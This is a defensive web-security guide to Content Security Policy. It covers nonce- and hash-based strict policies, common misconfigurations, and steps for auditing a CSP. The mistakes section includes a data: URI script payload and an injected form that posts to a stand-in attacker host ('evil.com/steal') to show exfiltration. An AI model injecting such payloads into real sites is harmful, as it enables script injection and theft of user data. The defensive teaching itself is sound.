Google's Recommended Strict CSP

// Google's strict CSP (research.google.com/pubs/pub45542):

// Option A: Nonce-based (SSR apps)
Content-Security-Policy:
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'self'

// Option B: Hash-based (static sites)
Content-Security-Policy:
  script-src 'sha256-{hash}' 'strict-dynamic';
  object-src 'none';
  base-uri 'self'

// Why this works:
// 1. nonce/hash: Only approved scripts run
// 2. strict-dynamic: Trusted scripts can load dependencies
//    (replaces URL allowlists — no more CDN bypasses)
// 3. object-src 'none': Blocks plugins (Flash, Java)
// 4. base-uri 'self': Prevents <base> tag injection

// For maximum protection, add:
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  upgrade-insecure-requests;
  report-uri /csp-reports

Common CSP Mistakes

// ❌ Mistake 1: Using wildcard
script-src *
// Allows scripts from ANY origin — no protection

// ❌ Mistake 2: data: in script-src
script-src 'self' data:
// Allows: <script src="data:text/javascript,alert(1)">

// ❌ Mistake 3: Missing default-src
script-src 'self'
// Without default-src, unlisted directives are UNRESTRICTED
// connect-src defaults to * → data exfiltration possible

// ❌ Mistake 4: Mixing nonce with unsafe-inline
script-src 'nonce-abc' 'unsafe-inline'
// In browsers without nonce support: unsafe-inline applies
// With strict-dynamic: unsafe-inline is auto-ignored ✅

// ❌ Mistake 5: Forgetting frame-ancestors
// Not part of default-src fallback!
// Must be explicitly set

// ❌ Mistake 6: Not setting form-action
// Attacker injects <form action="https://evil.com/steal">
// User submits form → data sent to attacker

// ✅ Always start with: default-src 'none'
// Then add only what you need

Google Senior Frontend — CSP Audit

Q: How would you audit an existing app's CSP policy?

Step 1: Get the current CSP — check HTTP response headers in DevTools Network tab. Step 2: Use Google's CSP Evaluator (csp-evaluator.withgoogle.com) — it identifies known bypasses, missing directives, overly broad sources. Step 3: Check for common weaknesses: (a) 'unsafe-inline' in script-src — allows XSS. (b) CDN domains in script-src — JSONP/library bypasses. (c) Missing object-src, base-uri, form-action. (d) data: or blob: in script-src. Step 4: Verify nonce implementation: Is nonce random per request? Is it long enough (128+ bits)? Is it from crypto.randomBytes, not Math.random? Step 5: Check violation reports: Are they being collected? What's the volume? Are there false positives? Step 6: Test with CSP Tester tool — attempt injecting scripts with common bypasses. Step 7: Review third-party scripts — each one is a trust decision. Minimize the number of origins. Prefer self-hosted copies over CDN links.
